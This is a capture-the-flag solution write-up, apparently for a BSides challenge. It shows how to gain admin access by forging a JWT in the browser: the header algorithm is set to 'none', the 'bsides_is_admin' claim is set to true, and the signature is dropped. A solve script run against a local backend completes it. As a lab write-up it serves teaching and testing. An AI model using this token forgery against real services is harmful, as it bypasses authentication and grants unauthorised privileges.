# Solution

You could do all of this via the API or just by using the frontend.

## Register/Login

Register an account and login.

## Attempt to get the flag

Try to get the flag, notice you get a 401 Unauthorized. Inspect the request
and grab the JWT from the Authorization header.

## Inspect JWT

Visit jwt.io and paste in the JWT.
Note the `bsides_is_admin` claim in the payload and the HS256 alg in the header.

## Craft and store the JWT

```js
const tok = localStorage.getItem('jwt')
  .split('.')
  .slice(0, 2)
  .map(v => JSON.parse(atob(v)))
tok[0].alg = "none"
tok[1].bsides_is_admin = true
localStorage.setItem('jwt', tok.map(v => btoa(JSON.stringify(v))).join(".") + ".")
```

## Get the flag

Hit "Get flag"!

# Solution Script

```bash
npm i
export SIGNED_SEALED_BASE_BACKEND_URL=http://localhost:48323
npm run solve
```